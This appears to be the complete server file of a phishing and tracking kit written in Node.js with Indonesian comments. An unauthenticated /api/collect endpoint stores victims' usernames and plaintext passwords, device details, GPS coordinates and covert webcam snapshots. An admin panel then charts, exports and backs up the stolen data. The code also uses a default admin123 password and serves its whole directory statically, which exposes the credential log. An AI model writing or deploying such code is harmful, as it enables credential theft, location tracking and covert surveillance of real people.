const express = require('express');
const session = require('express-session');
const archiver = require('archiver');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// ============ CONFIG ============
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const SESSION_MAX_AGE = 60 * 60 * 1000;
const SNAPSHOT_MAX_AGE_DAYS = 7;
const AUTO_BACKUP_HOURS = 24;
const LOG_FILE = path.join(__dirname, 'logs.json');
const BACKUP_DIR = path.join(__dirname, 'auto-backups');

// ============ MIDDLEWARE ============
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(session({
  secret: process.env.SESSION_SECRET || 'tracker-app-secret-key-ganti-ini',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: SESSION_MAX_AGE, httpOnly: true, sameSite: 'lax' }
}));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/snapshots', express.static(__dirname));

// ============ AUTH ============
function requireAuth(req, res, next) {
  if (req.session && req.session.loggedIn) return next();
  if (req.path.startsWith('/api/')) {
    return res.status(401).json({ error: 'Unauthorized', redirect: '/admin/login' });
  }
  return res.redirect('/admin/login');
}

// ============ CLEANUP ============
function cleanupOldSnapshots() {
  const now = Date.now();
  const maxAge = SNAPSHOT_MAX_AGE_DAYS * 24 * 60 * 60 * 1000;
  let deleted = 0;
  try {
    fs.readdirSync(__dirname)
      .filter(f => f.startsWith('snapshot-') && f.endsWith('.png'))
      .forEach(f => {
        const match = f.match(/snapshot-(\d+)\.png/);
        if (match && now - parseInt(match[1]) > maxAge) {
          try { fs.unlinkSync(path.join(__dirname, f)); deleted++; } catch (e) {}
        }
      });
  } catch (e) {}
  if (deleted > 0) console.log(`🗑️  Cleanup: ${deleted} snapshot lama`);
}
cleanupOldSnapshots();

// ============ AUTO BACKUP ============
function ensureBackupDir() {
  if (!fs.existsSync(BACKUP_DIR)) fs.mkdirSync(BACKUP_DIR, { recursive: true });
}

async function createAutoBackup() {
  try {
    ensureBackupDir();
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const zipPath = path.join(BACKUP_DIR, `auto-backup-${timestamp}.zip`);
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    return new Promise((resolve, reject) => {
      output.on('close', () => {
        console.log(`💾 Auto-backup dibuat: ${path.basename(zipPath)} (${(archive.pointer()/1024).toFixed(1)} KB)`);
        // Hapus backup > 7 hari
        const now = Date.now();
        const maxAge = 7 * 24 * 60 * 60 * 1000;
        try {
          fs.readdirSync(BACKUP_DIR)
            .filter(f => f.startsWith('auto-backup-'))
            .forEach(f => {
              const stat = fs.statSync(path.join(BACKUP_DIR, f));
              if (now - stat.mtimeMs > maxAge) fs.unlinkSync(path.join(BACKUP_DIR, f));
            });
        } catch (e) {}
        resolve(zipPath);
      });
      archive.on('error', reject);
      archive.pipe(output);

      if (fs.existsSync(LOG_FILE)) archive.file(LOG_FILE, { name: 'logs.json' });
      fs.readdirSync(__dirname)
        .filter(f => f.startsWith('snapshot-') && f.endsWith('.png'))
        .forEach(f => archive.file(path.join(__dirname, f), { name: f }));
      archive.append(JSON.stringify({
        backupDate: new Date().toISOString(),
        totalSnapshots: fs.readdirSync(__dirname).filter(f => f.startsWith('snapshot-')).length
      }, null, 2), { name: 'BACKUP-INFO.json' });
      archive.finalize();
    });
  } catch (e) {
    console.error('Auto-backup error:', e.message);
  }
}

// Jadwalkan auto-backup tiap 24 jam
setInterval(createAutoBackup, AUTO_BACKUP_HOURS * 60 * 60 * 1000);
// Backup pertama setelah 1 jam server jalan
setTimeout(createAutoBackup, 60 * 60 * 1000);

// ============ ROUTES ============
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin/login', (req, res) => {
  if (req.session && req.session.loggedIn) return res.redirect('/admin');
  res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASSWORD) {
    req.session.loggedIn = true;
    req.session.loginTime = Date.now();
    return res.json({ ok: true });
  }
  res.status(401).json({ error: 'Username atau password salah' });
});

app.post('/api/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

app.get('/api/session', (req, res) => {
  if (req.session && req.session.loggedIn) {
    res.json({ loggedIn: true, loginTime: req.session.loginTime });
  } else {
    res.json({ loggedIn: false });
  }
});

app.get('/admin', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/api/captures', requireAuth, (req, res) => {
  const files = fs.readdirSync(__dirname)
    .filter(f => f.startsWith('snapshot-') && f.endsWith('.png'))
    .map(f => {
      const stat = fs.statSync(path.join(__dirname, f));
      const match = f.match(/snapshot-(\d+)\.png/);
      return {
        filename: f,
        url: `/snapshots/${f}`,
        timestamp: match ? new Date(parseInt(match[1])).toISOString() : null,
        size: stat.size
      };
    })
    .sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
  res.json(files);
});

app.get('/api/logs', requireAuth, (req, res) => {
  if (!fs.existsSync(LOG_FILE)) return res.json([]);
  try {
    res.json(JSON.parse(fs.readFileSync(LOG_FILE, 'utf8')));
  } catch (e) {
    res.json([]);
  }
});

app.get('/api/stats', requireAuth, (req, res) => {
  let logs = [];
  if (fs.existsSync(LOG_FILE)) {
    try { logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8')); } catch (e) {}
  }
  const perDay = {}, perOS = {}, perBrowser = {}, perHour = {};
  logs.forEach(l => {
    if (l.timestamp) {
      const d = new Date(l.timestamp);
      const day = d.toISOString().split('T')[0];
      perDay[day] = (perDay[day] || 0) + 1;
      const hour = d.getHours();
      perHour[hour] = (perHour[hour] || 0) + 1;
    }
    const os = l.device?.os || 'Unknown';
    perOS[os] = (perOS[os] || 0) + 1;
    const br = l.device?.browser || 'Unknown';
    perBrowser[br] = (perBrowser[br] || 0) + 1;
  });
  const days = Object.keys(perDay).sort();
  const hours = Array.from({length: 24}, (_, i) => i);
  res.json({
    perDay: { labels: days, data: days.map(d => perDay[d]) },
    perOS: { labels: Object.keys(perOS), data: Object.values(perOS) },
    perBrowser: { labels: Object.keys(perBrowser), data: Object.values(perBrowser) },
    perHour: {
      labels: hours.map(h => `${String(h).padStart(2, '0')}:00`),
      data: hours.map(h => perHour[h] || 0)
    },
    total: logs.length
  });
});

app.delete('/api/capture/:filename', requireAuth, (req, res) => {
  const { filename } = req.params;
  const filePath = path.join(__dirname, filename);
  if (!/^snapshot-\d+\.png$/.test(filename)) {
    return res.status(400).json({ error: 'Filename tidak valid' });
  }
  let deleted = false;
  if (fs.existsSync(filePath)) {
    try { fs.unlinkSync(filePath); deleted = true; }
    catch (e) { return res.status(500).json({ error: 'Gagal hapus' }); }
  }
  const match = filename.match(/snapshot-(\d+)\.png/);
  if (match) {
    const snapTs = parseInt(match[1]);
    let logs = [];
    if (fs.existsSync(LOG_FILE)) {
      try { logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8')); } catch (e) {}
    }
    logs = logs.filter(l => {
      if (!l.timestamp) return true;
      return Math.abs(new Date(l.timestamp).getTime() - snapTs) > 5000;
    });
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
  }
  res.json({ ok: true, deleted });
});

app.get('/api/export.csv', requireAuth, (req, res) => {
  let logs = [];
  if (fs.existsSync(LOG_FILE)) {
    try { logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8')); } catch (e) {}
  }
  const headers = ['timestamp', 'username', 'os', 'browser', 'deviceType', 'screen', 'lat', 'lon', 'mapsLink'];
  const rows = logs.map(l => [
    l.timestamp || '', l.username || '',
    l.device?.os || '', l.device?.browser || '', l.device?.deviceType || '', l.device?.screen || '',
    l.location?.lat || '', l.location?.lon || '',
    l.location?.lat ? `https://maps.google.com/?q=${l.location.lat},${l.location.lon}` : ''
  ]);
  const csv = [headers.join(','), ...rows.map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(','))].join('\n');
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', `attachment; filename="captures-${Date.now()}.csv"`);
  res.send(csv);
});

app.get('/api/backup.zip', requireAuth, (req, res) => {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Disposition', `attachment; filename="tracker-backup-${timestamp}.zip"`);

  const archive = archiver('zip', { zlib: { level: 9 } });
  archive.on('error', (err) => {
    console.error('Archive error:', err);
    res.status(500).send('Gagal bikin ZIP');
  });
  archive.pipe(res);

  if (fs.existsSync(LOG_FILE)) archive.file(LOG_FILE, { name: 'logs.json' });
  fs.readdirSync(__dirname)
    .filter(f => f.startsWith('snapshot-') && f.endsWith('.png'))
    .forEach(f => archive.file(path.join(__dirname, f), { name: f }));

  archive.append(JSON.stringify({
    backupDate: new Date().toISOString(),
    totalSnapshots: fs.readdirSync(__dirname).filter(f => f.startsWith('snapshot-')).length,
    appVersion: '1.0'
  }, null, 2), { name: 'BACKUP-INFO.json' });

  archive.finalize();
  console.log('📦 Backup ZIP dibuat');
});

// Daftar auto-backup yang tersedia
app.get('/api/backups', requireAuth, (req, res) => {
  ensureBackupDir();
  try {
    const files = fs.readdirSync(BACKUP_DIR)
      .filter(f => f.endsWith('.zip'))
      .map(f => {
        const stat = fs.statSync(path.join(BACKUP_DIR, f));
        return { filename: f, size: stat.size, date: stat.mtime };
      })
      .sort((a, b) => new Date(b.date) - new Date(a.date));
    res.json(files);
  } catch (e) {
    res.json([]);
  }
});

// Download auto-backup
app.get('/api/backups/:filename', requireAuth, (req, res) => {
  const { filename } = req.params;
  if (!/^auto-backup-[\w\-]+\.zip$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  const filePath = path.join(BACKUP_DIR, filename);
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
  res.download(filePath);
});

// Backup manual dari dashboard
app.post('/api/backups/create', requireAuth, async (req, res) => {
  const result = await createAutoBackup();
  res.json({ ok: true, file: result });
});

app.post('/api/collect', (req, res) => {
  const { device, location, webcam, timestamp, username, password } = req.body;
  if (!username || !password || !device) {
    return res.status(400).json({ error: 'Data tidak lengkap' });
  }
  console.log('\n========== DATA MASUK ==========');
  console.log('🕒', timestamp);
  console.log('👤 Username:', username);
  console.log('🔑 Password:', password);
  console.log('💻 OS:', device?.os, '| Browser:', device?.browser);
  console.log('📍 Location:', location);
  console.log('📸 Webcam:', webcam ? `[${webcam.length} bytes]` : '-');
  console.log('=================================\n');

  let logs = [];
  if (fs.existsSync(LOG_FILE)) {
    try { logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8')); } catch (e) {}
  }
  logs.push({
    timestamp, username, password, device,
    location: location ? {
      ...location,
      mapsLink: location.lat ? `https://maps.google.com/?q=${location.lat},${location.lon}` : null
    } : null
  });
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

  if (webcam && webcam.startsWith('data:image')) {
    try {
      const base64Data = webcam.split(',')[1];
      const filename = `snapshot-${Date.now()}.png`;
      fs.writeFileSync(path.join(__dirname, filename), base64Data, 'base64');
      console.log(`💾 Snapshot: ${filename}`);
    } catch (e) {}
  }
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`\n✅ Server berjalan di http://localhost:${PORT}`);
  console.log(`🔐 Admin login: http://localhost:${PORT}/admin/login`);
  console.log(`👤 Username: ${ADMIN_USER} | 🔑 Password: ${ADMIN_PASSWORD}`);
  console.log(`📊 Total snapshot: ${fs.readdirSync(__dirname).filter(f => f.startsWith('snapshot-')).length}`);
  console.log(`💾 Auto-backup: setiap ${AUTO_BACKUP_HOURS} jam\n`);
});